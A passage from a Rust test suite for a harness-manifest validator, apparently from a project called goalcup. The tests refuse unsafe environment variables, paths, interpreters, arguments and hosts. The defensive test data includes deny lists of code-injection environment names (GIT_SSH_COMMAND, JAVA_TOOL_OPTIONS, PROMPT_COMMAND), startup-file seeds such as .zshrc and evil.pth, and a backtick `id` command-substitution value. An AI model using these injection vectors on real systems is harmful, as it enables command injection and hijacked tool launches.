        strings(&["auth.goalcup.example"]),
    );
    refused(&t, PINNED, &["capture.auth_hosts", "tracker's own host"]);
    let mut t = hermes();
    set(&mut t, &["capture"], "goal_flag", "--goalcup-goal");
    refused(&t, PINNED, &["goal_flag", "delivery-agnostic"]);
    // A loopback host is already not a capture host.
    let mut t = codex();
    set(&mut t, &["capture", "hosts"], "host", "127.0.0.1");
    refused(&t, PINNED, &["not a lowercase DNS name"]);
}

#[test]
fn a_host_that_is_also_an_auth_host_is_refused() {
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "auth_hosts",
        strings(&["chatgpt.com"]),
    );
    refused(&t, PINNED, &["authentication host", "belongs in `hosts`"]);
}

// ---------------------------------------------------------------------------------------
// Refusal table: environment (I5b, I5c, M1, I3)
// ---------------------------------------------------------------------------------------

#[test]
fn xdg_is_refused_as_a_capture_env_key_and_as_home_env() {
    for key in ["XDG_CONFIG_HOME", "xdg_data_home", "XDG_ANYTHING"] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], key, "x");
        refused(&t, PINNED, &["capture.env", "XDG_"]);
        let mut t = codex();
        set(
            &mut t,
            &["capture", "home"],
            "env",
            key.to_ascii_uppercase(),
        );
        refused(&t, PINNED, &["capture.home.env", "XDG_"]);
    }
}

#[test]
fn an_env_value_that_is_a_path_a_url_or_an_expansion_is_refused() {
    let cases = [
        ("/usr/local/bin", "starts with `/`"),
        ("~/bin", "starts with `/` or `~`"),
        ("~", "starts with `/` or `~`"),
        ("$HOME/x", "`$`"),
        ("a$b", "`$`"),
        ("`id`", "backtick"),
        ("https://example.org", "`://`"),
        ("a/../b", "`..`"),
        ("..", "`..`"),
    ];
    for (value, needle) in cases {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "RUN_TAG", value);
        refused(&t, PINNED, &["RUN_TAG", needle]);
        // Env values stay strict for Dev (N1 relaxes args and the interpreter only).
        refused(&t, DEV, &["RUN_TAG", needle]);
    }
    // Template tokens and plain values pass: the value rule runs on the template.
    for value in [
        "{workspace}",
        "{workspace}/sub",
        "1",
        "false",
        "profile",
        "a.b",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "RUN_TAG", value);
        admitted(&t, PINNED);
    }
}

#[test]
fn shell_is_admitted_only_as_a_known_shell() {
    for ok in SHELL_VALUES {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "SHELL", *ok);
        admitted(&t, PINNED);
    }
    for bad in [
        "/usr/local/bin/x",
        "/bin/fish",
        "zsh",
        "/bin/zsh ",
        "/bin/../bin/sh",
        "$SHELL",
        "",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "SHELL", bad);
        refused(&t, PINNED, &["SHELL is admitted only as"]);
    }
    // `shell` in lowercase is the same variable.
    let mut t = codex();
    tbl(&mut t, &["capture", "env"]).remove("SHELL");
    set(&mut t, &["capture", "env"], "shell", "/usr/local/bin/x");
    refused(&t, PINNED, &["SHELL is admitted only as"]);
}

#[test]
fn node_use_env_proxy_is_admitted_only_as_1() {
    // D59: it names no endpoint; it makes a Node harness honour the proxy the launch pins.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "NODE_USE_ENV_PROXY", "1");
    admitted(&t, PINNED);
    for bad in ["0", "true", "", " 1", "1 ", "yes"] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "NODE_USE_ENV_PROXY", bad);
        refused(
            &t,
            PINNED,
            &[
                "capture.env",
                "`NODE_USE_ENV_PROXY` must be exactly `1` (D59)",
            ],
        );
    }
    // Every other proxy name keeps its refusal, whatever the value.
    for name in ["HTTPS_PROXY", "NODE_PROXY", "NO_PROXY", "NODE_USE_PROXY"] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "1");
        refused(&t, PINNED, &["capture.env", name, "is a proxy variable"]);
    }
    // Admitted in `capture.env` only: it is no config home.
    let mut t = codex();
    set(&mut t, &["capture", "home"], "env", "NODE_USE_ENV_PROXY");
    refused(
        &t,
        PINNED,
        &[
            "capture.home.env",
            "NODE_USE_ENV_PROXY",
            "is a proxy variable",
        ],
    );
}

#[test]
fn every_shipped_env_value_passes_the_value_rule() {
    for (k, v) in [
        ("SHELL", "/bin/zsh"),
        ("DISABLE_AUTOUPDATER", "1"),
        ("ENABLE_CLAUDEAI_MCP_SERVERS", "false"),
        ("CLAUDE_CODE_SKIP_PLUGIN_MCP_SERVERS", "1"),
        ("TERMINAL_HOME_MODE", "profile"),
    ] {
        assert_eq!(env_value_denied(k, v), None, "{k}={v}");
    }
}

#[test]
fn every_new_env_deny_name_is_refused() {
    // The I5c additions, spelled out; a lowercase spelling is the same name.
    let names = [
        "GIT_SSH_COMMAND",
        "GIT_SSH",
        "GIT_ASKPASS",
        "SSH_ASKPASS",
        "GIT_EXEC_PATH",
        "GIT_TEMPLATE_DIR",
        "GIT_PAGER",
        "PAGER",
        "EDITOR",
        "VISUAL",
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "PERL5LIB",
        "PERLLIB",
        "RUBYLIB",
        "PROMPT_COMMAND",
        "PS4",
        "GIT_CONFIG",
        "GIT_CONFIG_GLOBAL",
        "GIT_CONFIG_SYSTEM",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_KEY_0",
        "GIT_CONFIG_VALUE_0",
        "GIT_CONFIG_PARAMETERS",
        "npm_config_registry",
        "NPM_CONFIG_PREFIX",
        "PIP_INDEX_URL",
        "pip_require_virtualenv",
        "XDG_CONFIG_HOME",
        "GOALCUP_ANYTHING",
    ];
    for name in names {
        assert!(
            env_key_denied(name, EnvContext::CaptureEnv).is_some(),
            "{name} must be refused in capture.env"
        );
        assert!(
            env_key_denied(&name.to_ascii_lowercase(), EnvContext::CaptureEnv).is_some(),
            "{name} lower-cased"
        );
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "x");
        refused(&t, PINNED, &["capture.env", name]);
    }
    // And every row of the tables themselves.
    for name in INJECTION_ENV {
        assert!(
            env_key_denied(name, EnvContext::CaptureEnv).is_some(),
            "{name}"
        );
        assert!(
            env_key_denied(name, EnvContext::HomeEnv).is_some(),
            "{name} as home.env"
        );
    }
    for (prefix, _) in INJECTION_PREFIXES.iter().chain(PROVIDER_PREFIXES) {
        let name = format!("{prefix}X");
        assert!(
            env_key_denied(&name, EnvContext::CaptureEnv).is_some(),
            "{name}"
        );
        assert!(
            env_key_denied(&name, EnvContext::HomeEnv).is_some(),
            "{name} as home.env"
        );
    }
    // A name near a deny row but not on it is admitted.
    for ok in [
        "GITHUB_REPO",
        "PIPELINE_MODE",
        "LDFLAGS",
        "NPM_CONFIGURED",
        "EDITORS_NOTE",
    ] {
        assert_eq!(env_key_denied(ok, EnvContext::CaptureEnv), None, "{ok}");
    }
}

#[test]
fn hermes_home_passes_as_home_env_and_fails_as_a_capture_env_key() {
    for home in [
        "HERMES_HOME",
        "CODEX_HOME",
        "CLAUDE_CONFIG_DIR",
        "WORKLOAD_HOME",
    ] {
        assert_eq!(env_key_denied(home, EnvContext::HomeEnv), None, "{home}");
    }
    // In `capture.env` every home or config-dir name is refused, by shape, not by harness name.
    for name in ["HERMES_HOME", "GH_CONFIG_DIR", "EXAMPLE_CONFIG_HOME"] {
        assert!(
            env_key_denied(name, EnvContext::CaptureEnv)
                .is_some_and(|why| why.contains("capture.home.env")),
            "{name}"
        );
    }
    // A name in another harness's namespace is not refused for that reason alone.
    assert_eq!(env_key_denied("HERMES_QUIET", EnvContext::CaptureEnv), None);
    // Through the manifest: Codex with HERMES_HOME in `env`.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "HERMES_HOME", "x");
    refused(
        &t,
        PINNED,
        &["capture.env", "HERMES_HOME", "capture.home.env"],
    );
    // And Hermes itself, whose home.env is HERMES_HOME, validates (the fixture test above).
    admitted(&hermes(), PINNED);
}

#[test]
fn home_env_has_its_own_rules() {
    // SHELL, XDG_ and GOALCUP_ are refused as a home variable; so is anything the substring
    // rules refuse, and the pinned and trust names.
    for bad in [
        "SHELL",
        "XDG_CONFIG_HOME",
        "GOALCUP_HOME",
        "HOME",
        "PATH",
        "OPENAI_HOME",
        "API_ENDPOINT",
        "SSL_CERT_FILE",
        "MY_PROXY",
        "AUTH_DIR",
        "NODE_OPTIONS",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "home"], "env", bad);
        refused(&t, PINNED, &["capture.home.env", bad]);
    }
    let mut t = codex();
    set(&mut t, &["capture", "home"], "env", "lower_case");
    refused(&t, PINNED, &["capture.home.env", "^[A-Z]"]);
}

#[test]
fn the_pinned_variables_are_distinct_and_not_capture_env_keys() {
    // `capture.env` may not set the config-home variable the tracker points itself.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "CODEX_HOME", "x");
    refused(&t, PINNED, &["CODEX_HOME", "pinned by `capture.home.env`"]);
    let mut t = codex();
    set(&mut t, &["capture", "env"], "codex_home", "x");
    refused(&t, PINNED, &["pinned by `capture.home.env`"]);
    // The home variable and a CA variable are distinct names.
    let mut t = codex();
    set(
        &mut t,
        &["capture", "ca"],
        "env",
        strings(&["CODEX_CA_CERTIFICATE"]),
    );
    set(&mut t, &["capture", "home"], "env", "NODE_EXTRA_CA_CERTS");
    refused(&t, PINNED, &["capture.home.env", "certificate trust"]);
}

// ---------------------------------------------------------------------------------------
// Refusal table: seeds, dirs, startup files (I5a)
// ---------------------------------------------------------------------------------------

fn with_seed(file: &str) -> Table {
    let mut t = hermes();
    tbl(&mut t, &["capture", "home"])["seed"]
        .as_array_mut()
        .unwrap()
        .push(Value::Table(
            [("file".to_string(), Value::String(file.into()))]
                .into_iter()
                .collect(),
        ));
    t
}

fn with_dir(dir: &str) -> Table {
    let mut t = hermes();
    tbl(&mut t, &["capture", "home"])["dirs"]
        .as_array_mut()
        .unwrap()
        .push(Value::String(dir.into()));
    t
}

#[test]
fn each_startup_file_class_is_refused_as_a_seed() {
    // Every closed basename, plain, in the wrong case (APFS), and nested.
    for name in STARTUP_BASENAMES {
        refused(
            &with_seed(name),
            PINNED,
            &["capture.home.seed", name, "startup file"],
        );
        refused(
            &with_seed(&name.to_ascii_uppercase()),
            PINNED,
            &["capture.home.seed", "startup file"],
        );
        refused(
            &with_seed(&format!("sub/{name}")),
            PINNED,
            &["capture.home.seed", "startup file"],
        );
    }
    // Suffix class: a `.pth` file.
    refused(&with_seed("evil.pth"), PINNED, &["`.pth`"]);
    refused(&with_seed("EVIL.PTH"), PINNED, &["`.pth`"]);
    // Component class, anywhere in the path.
    for comp in STARTUP_COMPONENTS {
        refused(
            &with_seed(&format!("{comp}/x")),
            PINNED,
            &["capture.home.seed", "directory"],
        );
        refused(
            &with_seed(&format!("a/{comp}/x")),
            PINNED,
            &["capture.home.seed", "directory"],
        );
    }
    // Path class: git's global config.
    refused(
        &with_seed(".config/git/config"),
        PINNED,
        &["capture.home.seed", "git's global"],
    );
    refused(
        &with_seed("x/.CONFIG/GIT/ignore"),
        PINNED,
        &["git's global"],
    );
    // Hermes's own seeds, a `.config` directory without `git`, and a git-like name pass.
    admitted(&hermes(), PINNED);
    admitted(&with_seed(".config/hermes/config.yaml"), PINNED);
    admitted(&with_seed("git-notes.txt"), PINNED);
}

#[test]
fn startup_files_are_refused_as_dirs_too() {
    refused(&with_dir(".ssh"), PINNED, &["capture.home.dirs", ".ssh"]);
    refused(
        &with_dir("a/.zshrc"),
        PINNED,
        &["capture.home.dirs", "startup file"],
    );
    refused(&with_dir(".config/git"), PINNED, &["capture.home.dirs"]);
    admitted(&with_dir("cache"), PINNED);
}

#[test]
fn seed_and_dir_paths_follow_the_component_rule() {
    for bad in [
        "../x",
        "/abs",
        "a/./b",
        "a//b",
        "a b",
        "a/b/c/d/e",
        "",
        "x\u{e9}",
    ] {
        refused(&with_seed(bad), PINNED, &["capture.home.seed"]);
    }
    refused(&with_dir("../x"), PINNED, &["capture.home.dirs"]);
    let mut t = hermes();
    for i in 0..9 {
        tbl(&mut t, &["capture", "home"])["dirs"]
            .as_array_mut()
            .unwrap()
            .push(Value::String(format!("d{i}")));
    }
    refused(&t, PINNED, &["capture.home.dirs", "more than 8"]);
    let mut t = hermes();
    for i in 0..14 {
        tbl(&mut t, &["capture", "home"])["seed"]
            .as_array_mut()
            .unwrap()
            .push(Value::Table(
                [("file".to_string(), Value::String(format!("s{i}")))]
                    .into_iter()
                    .collect(),
            ));
    }
    refused(&t, PINNED, &["more than 16"]);
    // A twice-seeded file.
    refused(&with_seed("auth.json"), PINNED, &["seeded twice"]);
    // The modes.
    let mut t = hermes();
    tbl(&mut t, &["capture", "home", "seed"]).insert("mode".into(), "0400".into());
    admitted(&t, PINNED);
}

#[test]
fn per_run_only_fields_need_a_per_run_home() {
    for (field, value) in [
        (
            "seed",
            Value::Array(vec![Value::Table(
                [("file".to_string(), Value::String("a.txt".into()))]
                    .into_iter()
                    .collect(),
            )]),
        ),
        ("dirs", strings(&["a"])),
        ("per_run_dir", "x".into()),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "home"], field, value);
        refused(&t, PINNED, &[field, "per_run"]);
    }
    let mut t = hermes();
    set(&mut t, &["capture", "home"], "per_run_dir", "Bad Dir");
    refused(&t, PINNED, &["per_run_dir"]);
}

#[test]
fn real_dirs_are_user_home_relative() {
    for bad in [
        "/Users/x/.codex",
        "{user_home}",
        "{user_home}/",
        "{user_home}/../x",
        "{home}/x",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "home"], "real_dirs", strings(&[bad]));
        refused(&t, PINNED, &["real_dirs"]);
    }
    let mut t = codex();
    set(&mut t, &["capture", "home"], "real_dirs", strings(&[]));
    refused(&t, PINNED, &["1 to 4"]);
}

// ---------------------------------------------------------------------------------------
// Refusal table: the executable (I5d, N3)
// ---------------------------------------------------------------------------------------

#[test]
fn an_interpreter_program_is_refused_for_pinned_and_admitted_for_dev() {
    let mut t = codex();
    set(&mut t, &["capture", "executable"], "program", "python3");
    refused(
        &t,
        PINNED,
        &["capture.executable.program", "python3", "interpreter"],
    );
    admitted(&t, DEV);
    // `codex`, `claude` and `hermes` are not interpreters.
    for ok in ["codex", "claude", "hermes"] {
        let mut t = codex();
        set(&mut t, &["capture", "executable"], "program", ok);
        admitted(&t, PINNED);
    }
}

#[test]
fn every_listed_interpreter_is_refused() {
    for name in INTERPRETER_PROGRAMS {
        assert!(is_interpreter_program(name), "{name}");
        let mut t = codex();
        set(&mut t, &["capture", "executable"], "program", *name);
        refused(&t, PINNED, &["interpreter"]);
        admitted(&t, DEV);
    }
}

#[test]
fn interpreter_names_are_case_insensitive_and_versioned() {
    // N3: APFS resolves `Python3`, and macOS and package managers ship versioned names.
    for name in [
        "Python3",
        "PYTHON",
        "python3.13",
        "python3.13t",
        "python3.9",
        "python2.7",
        "pypy3.10",
        "PyPy3.10",
        "perl5.34",
        "perl5.34.1",
        "ruby3.3",
        "node22",
        "Node",
        "nodejs18",
        "bash5",
        "BASH",
        "Zsh",
        "php8.3",
        "lua5.4",
        "uv0",
        "deno2",
        "bun1",
    ] {
        assert!(is_interpreter_program(name), "{name} is an interpreter");
        let mut t = codex();
        set(&mut t, &["capture", "executable"], "program", name);
        refused(&t, PINNED, &["interpreter"]);
        admitted(&t, DEV);
    }
    // A listed name followed by anything but a version is a different program.
    for name in [
        "codex",
        "claude",
        "hermes",
        "python-lsp",
        "pythonista",
        "nodemon",
        "shell-gpt",
        "bashful",
        "perlite",
        "rubyist",
        "shellcheck",
        "opencode",
        "envoy",
        "opener",
        "luafmt",
        "agent5",
    ] {
        assert!(!is_interpreter_program(name), "{name} is not");
    }
}

#[test]
fn the_executable_fields_follow_their_grammars() {
    for bad in [
        "",
        "/usr/bin/codex",
        "../codex",
        "a b",
        "x/y",
        &"a".repeat(65),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "executable"], "program", bad);
        refused(&t, PINNED, &["capture.executable.program"]);
    }
}

/// `version_args`: empty, or exactly one of `--version`, `-v`, `-V`, `version`. The probe runs
/// before the capture with no proxy and no record, so nothing else (`update`, `login`) may run.
#[test]
fn version_args_follow_their_grammar() {
    let mut t = hermes();
    tbl(&mut t, &["capture", "executable"]).remove("version_args");
    assert!(parsed(&t).capture.executable.version_args.is_empty());
    for ok in [
        vec![],
        vec!["--version"],
        vec!["-v"],
        vec!["-V"],
        vec!["version"],
    ] {
        let mut t = codex();
        set(
            &mut t,
            &["capture", "executable"],
            "version_args",
            strings(&ok),
        );
        admitted(&t, PINNED);
        admitted(&t, DEV);
    }
    for bad in [
        vec![""],
        vec!["update"],
        vec!["login"],
        vec!["mcp"],
        vec!["version", "--json"],
        vec!["--version=1"],
        vec!["/usr/bin/codex"],
        vec!["{workspace}"],
        vec!["--version", "--version"],
    ] {
        let mut t = codex();
        set(
            &mut t,
            &["capture", "executable"],
            "version_args",
            strings(&bad),
        );
        refused(&t, PINNED, &["capture.executable.version_args", "no proxy"]);
        refused(&t, DEV, &["capture.executable.version_args"]);
    }
}

/// D53: a manifest that still pins a build is refused with one sentence naming the retired
/// key, not with the newer-schema sentence an unknown key gets.
#[test]
fn a_retired_pin_key_is_refused_with_its_own_sentence() {
    for key in ["sha256", "version"] {
        let mut base = codex();
        set(&mut base, &["capture", "executable"], key, "0.153.0");
        let mut over = with_platform(codex(), "linux-x86_64", &[("SHELL", "/bin/bash")]);
        set(
            &mut over,
            &["capture", "platform", "linux-x86_64"],
            key,
            "0.153.0",
        );
        for (t, field) in [
            (base, format!("capture.executable.{key}")),
            (over, format!("capture.platform.linux-x86_64.{key}")),
        ] {
            let sentence = format!(
                "`{key}` is no longer a connector field (D53): the tracer records the build \
                 that runs instead of pinning one; delete the line."
            );
            for origin in [PINNED, DEV] {
                refused(&t, origin, &[&field, &sentence]);
                let msg = outcome(&t, origin).unwrap();
                assert!(!msg.contains(NEWER_SENTENCE), "{msg}");
            }
        }
    }
}

// ---------------------------------------------------------------------------------------
// Refusal table: args (I5e, N1) and the goal slot
// ---------------------------------------------------------------------------------------

#[test]
fn an_absolute_path_in_args_is_refused_for_pinned_and_admitted_for_dev() {
    let cases = [
        "/usr/bin/x",
        "~/x",
        "~",
        "--cfg=/etc/x",
        "--cfg=~/x",
        "-c=/x",
    ];
    for arg in cases {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec", arg, "--"]));
        refused(&t, PINNED, &["capture.args", arg, "absolute path"]);
        // N1: the exemption is keyed to `Origin::Dev`, the observable predicate.
        admitted(&t, DEV);
        assert!(arg_path_denied(arg).is_some());
    }
    // A relative value, a template token and an `=` mid-argument without a path pass.
    for arg in [
        "exec",
        "{workspace}",
        "-C",
        "a=b",
        "--model=gpt-5",
        "x/y",
        "./x",
    ] {
        assert_eq!(arg_path_denied(arg), None, "{arg}");
    }
}

#[test]
fn dev_relaxes_nothing_else_about_args() {
    // The deny list, the goalcup rule, the bounds and the templates hold for Dev too.
    for arg in [
        "--base-url",
        "--oss",
        "--settings",
        "--tag=goalcup",
        "{home}",
        "a}",
    ] {
        let mut t = workload();
        set(
            &mut t,
            &["capture"],
            "args",
            strings(&["/work/w.py", arg, "--"]),
        );
        assert!(
            outcome(&t, DEV).is_some(),
            "{arg} must stay refused under Dev"
        );
    }
}

#[test]
fn the_capture_arg_deny_list_still_applies() {
    for arg in [
        "--remote",
        "--oss",
        "--ephemeral",
        "--settings",
        "--base-url=x",
        "--profile=p",
    ] {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec", arg, "--"]));
        refused(&t, PINNED, &["capture.args", arg]);
    }
}

#[test]
fn the_goal_goes_exactly_one_way() {
    // Both `--` and a goal flag.
    let mut t = codex();
    set(&mut t, &["capture"], "goal_flag", "--prompt");
    refused(&t, PINNED, &["exactly one way"]);
    // Neither.
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&["exec"]));
    refused(&t, PINNED, &["exactly one way"]);
    // A goal flag alone.
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&["exec"]));
    set(&mut t, &["capture"], "goal_flag", "--prompt");
    admitted(&t, PINNED);
    for bad in [
        "prompt",
        "--Prompt",
        "--a=b",
        "--",
        "--1x",
        &format!("--{}", "a".repeat(31)),
    ] {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec"]));
        set(&mut t, &["capture"], "goal_flag", bad.to_string());
        refused(&t, PINNED, &["capture.goal_flag"]);
    }
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&["exec"]));
    set(&mut t, &["capture"], "goal_flag", "--base-url");
    refused(&t, PINNED, &["capture.goal_flag"]);
}

#[test]
fn args_and_continuation_have_bounds() {
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&[]));
    refused(&t, PINNED, &["1 to 64"]);
    let many: Vec<String> = (0..65).map(|i| format!("a{i}")).collect();
    let many: Vec<&str> = many.iter().map(String::as_str).collect();
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&many));
    refused(&t, PINNED, &["1 to 64"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&["exec", "a\u{7}b", "--"]),
    );
    refused(&t, PINNED, &["control character"]);
    let long = "x".repeat(4097);
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&["exec", &long, "--"]),
    );
    refused(&t, PINNED, &["longer than the bound"]);
    for bad in ["", "   ", "two\nlines"] {
        let mut t = codex();
        set(&mut t, &["capture"], "continuation", bad);
        refused(&t, PINNED, &["capture.continuation"]);
    }
}

#[test]
fn template_tokens_are_closed_and_braces_are_literal_only_doubled() {
    // Review R7 I-3: nothing supplies `{port}`, so a recipe naming it would validate and then
    // fail at launch, after the proxy is up.
    for bad in [
        "{port}",
        "{home}",
        "{user_home}",
        "a{b",
        "a}b",
        "{}",
        "{{{x}",
        "{a{b}",
    ] {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec", bad, "--"]));
        refused(&t, PINNED, &["capture.args"]);
        let mut t = codex();
        set(&mut t, &["capture", "env"], "RUN_TAG", bad);
        refused(&t, PINNED, &["capture.env"]);
    }
    for ok in ["{workspace}", "{{literal}}", "{{ {workspace} }}", "x{{y"] {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec", ok, "--"]));
        admitted(&t, PINNED);
    }
}

/// An env value may name the run's two homes, so a harness with a second state variable points
/// it inside them (C3-F9); an argument may not, and the value rules still hold around a token.
#[test]
fn an_env_value_may_name_the_run_homes_and_an_argument_may_not() {
    for ok in [
        "{config_home}",
        "{config_home}/data",
        "{run_home}/.cache/tool",
        "{workspace}/.tool",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "NEWTOOL_DATA_DIR", ok);
        admitted(&t, PINNED);
    }
    for token in ["{config_home}", "{run_home}"] {
        let mut t = codex();
        set(
            &mut t,
            &["capture"],
            "args",
            strings(&["exec", token, "--"]),
        );
        refused(&t, PINNED, &["capture.args", "not a token here"]);
    }
    for (bad, why) in [
        ("{config_home}/../x", "`..`"),
        ("{run_home}/$HOME", "`$`"),
        ("/{run_home}", "is a path"),
        ("{user_home}/x", "not a token here"),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], "NEWTOOL_DATA_DIR", bad);
        refused(&t, PINNED, &["capture.env", why]);
    }
}

#[test]
fn argv_guard_is_generic_and_only_tightens() {
    // Hermes's guard refuses the options Hermes acts on, abbreviations included.
    for arg in [
        "--profile",
        "--prof",
        "--tu",
        "--hel",
        "--cli=x",
        "-p",
        "-Qh",
        "-pwork",
    ] {
        let mut t = hermes();
        set(&mut t, &["capture"], "args", strings(&["chat", arg]));
        refused(&t, PINNED, &["capture.args", arg]);
    }
    // `-Q`, `--provider`, `--model` and the goal flag are untouched.
    admitted(&hermes(), PINNED);
    // Without `long_abbreviations`, only the exact name is refused.
    let mut t = hermes();
    set(
        &mut t,
        &["capture", "argv_guard"],
        "long_abbreviations",
        false,
    );
    set(&mut t, &["capture"], "args", strings(&["chat", "--prof"]));
    admitted(&t, PINNED);
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&["chat", "--profile"]),
    );
    refused(&t, PINNED, &["--profile"]);
    // The goal flag is guarded too.
    let mut t = hermes();
    set(&mut t, &["capture"], "goal_flag", "--help");
    refused(&t, PINNED, &["capture.goal_flag"]);
    // The guard's own shape.
    for (field, bad) in [
        ("long", strings(&["Profile"])),
        ("long", strings(&["--profile"])),
        ("short", strings(&["pp"])),
        ("short", strings(&["-"])),
        ("short_with_value", strings(&[""])),
    ] {
        let mut t = hermes();
        set(&mut t, &["capture", "argv_guard"], field, bad);
        refused(&t, PINNED, &["capture.argv_guard"]);
    }
}

// ---------------------------------------------------------------------------------------
// Refusal table: termination, hosts, hints, redaction
// ---------------------------------------------------------------------------------------

#[test]
fn termination_rules() {
    let mut t = codex();
    tbl(&mut t, &["capture", "termination"]).remove("native_binary");
    refused(&t, PINNED, &["native_binary", "required with `native_pid`"]);
    let mut t = hermes();
    set(
        &mut t,
        &["capture", "termination"],
        "native_binary",
        "hermes",
    );
    refused(
        &t,
        PINNED,
        &["native_binary", "refused with `process_group`"],
    );
    let mut t = codex();
    set(&mut t, &["capture", "termination"], "native_binary", "a/b");
    refused(&t, PINNED, &["native_binary", "comm"]);
    for bad in [0_i64, 61, 1000] {
        let mut t = codex();
        set(&mut t, &["capture", "termination"], "grace_seconds", bad);
        refused(&t, PINNED, &["grace_seconds", "1 to 60"]);
    }
    for ok in [1_i64, 10, 60] {
        let mut t = codex();
        set(&mut t, &["capture", "termination"], "grace_seconds", ok);
        admitted(&t, PINNED);
    }
    // Absent: process group, ten seconds.
    let mut t = hermes();
    tbl(&mut t, &["capture"]).remove("termination");
    admitted(&t, PINNED);
    let m = HarnessManifest::from_toml_str(&toml::to_string(&t).unwrap()).unwrap();
    assert_eq!(m.termination().strategy().as_str(), "process_group");
    assert_eq!(m.termination().grace_seconds(), 10);
}

#[test]
fn host_rules() {
    let mut t = codex();
    set(&mut t, &["capture"], "hosts", Value::Array(vec![]));
    refused(&t, PINNED, &["capture.hosts", "1 to 16"]);
    for bad in [
        "Chatgpt.com",
        "chatgpt.com:443",
        "https://chatgpt.com",
        "*.chatgpt.com",
        "chatgpt.com.",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "hosts"], "host", bad);
        refused(&t, PINNED, &["not a lowercase DNS name"]);
    }
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "evidence_paths",
        strings(&[]),
    );
    refused(&t, PINNED, &["scope 1 to 32 paths"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "prefix_paths",
        strings(&["/"]),
    );
    refused(&t, PINNED, &["prefix `/`"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "evidence_paths",
        strings(&["no-slash"]),
    );
    refused(&t, PINNED, &["must start with `/`"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "evidence_paths",
        strings(&["/a/../b"]),
    );
    refused(&t, PINNED, &["dot segment"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "evidence_paths",
        strings(&["/a?x=1"]),
    );
    refused(&t, PINNED, &["query or fragment"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "hosts"],
        "evidence_paths",
        strings(&["/a"]),
    );
    set(
        &mut t,
        &["capture", "hosts"],
        "prefix_paths",
        strings(&["/a"]),
    );
    refused(&t, PINNED, &["twice"]);
}

/// The shared provider table (C3-F13): a connector names a provider and gets its one reviewed
/// host row, appended after its own rows and held to every host rule.
#[test]
fn a_named_provider_adds_its_shared_host_row() {
    use goalcup_protocol::harness::provider_hosts;
    let parsed = |t: &Table| HarnessManifest::from_toml_str(&toml::to_string(t).unwrap());
    let table = provider_hosts().expect("the provider table parses");
    assert!(!table.is_empty());
    for (name, row) in table {
        let mut t = codex();
        set(&mut t, &["capture"], "hosts", Value::Array(vec![]));
        set(&mut t, &["capture"], "providers", strings(&[name]));
        admitted(&t, PINNED);
        assert_eq!(
            parsed(&t).unwrap().capture.hosts,
            std::slice::from_ref(row),
            "{name}"
        );
    }
    let mut t = codex();
    set(&mut t, &["capture"], "providers", strings(&["deepseek"]));
    admitted(&t, PINNED);
    let hosts = parsed(&t).unwrap().capture.hosts;
    assert_eq!(hosts.len(), 2);
    assert_eq!(hosts[0].host, "chatgpt.com");
    assert_eq!(hosts[1], table["deepseek"]);
    // An unknown or repeated name, and a row the connector also writes itself.
    let mut t = codex();
    set(&mut t, &["capture"], "providers", strings(&["nosuch"]));
    refused(
        &t,
        PINNED,
        &[
            "capture.providers",
            "`nosuch`",
            "not in the shared provider table",
            "deepseek",
        ],
    );
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "providers",
        strings(&["deepseek", "deepseek"]),
    );
    refused(&t, PINNED, &["capture.providers", "named twice"]);
    let mut t = codex();
    set(&mut t, &["capture", "hosts"], "host", "api.deepseek.com");
    set(&mut t, &["capture"], "providers", strings(&["deepseek"]));
    refused(
        &t,
        PINNED,
        &["capture.hosts", "api.deepseek.com", "two rules"],
    );
}

#[test]
fn an_unknown_protocol_hint_is_capture_only_not_refused() {
    // D43 ruling 8.
    for hint in ["some-new-protocol", "e00-controlled", "x", "grpc.v2"] {
        let mut t = codex();
        set(&mut t, &["capture", "hosts"], "protocol_hint", hint);
        admitted(&t, PINNED);
    }
    // A malformed hint is still refused: the grammar keeps a misspelling a visible name.
    for hint in ["Some-Protocol", "1protocol", "a_b", "", &"a".repeat(65)] {
        let mut t = codex();
        set(
            &mut t,
            &["capture", "hosts"],
            "protocol_hint",
            hint.to_string(),
        );
        refused(&t, PINNED, &["protocol_hint"]);
    }
}

/// One `extra_patterns` row from `(key, value)` pairs.
fn rule_row(fields: &[(&str, &str)]) -> Value {
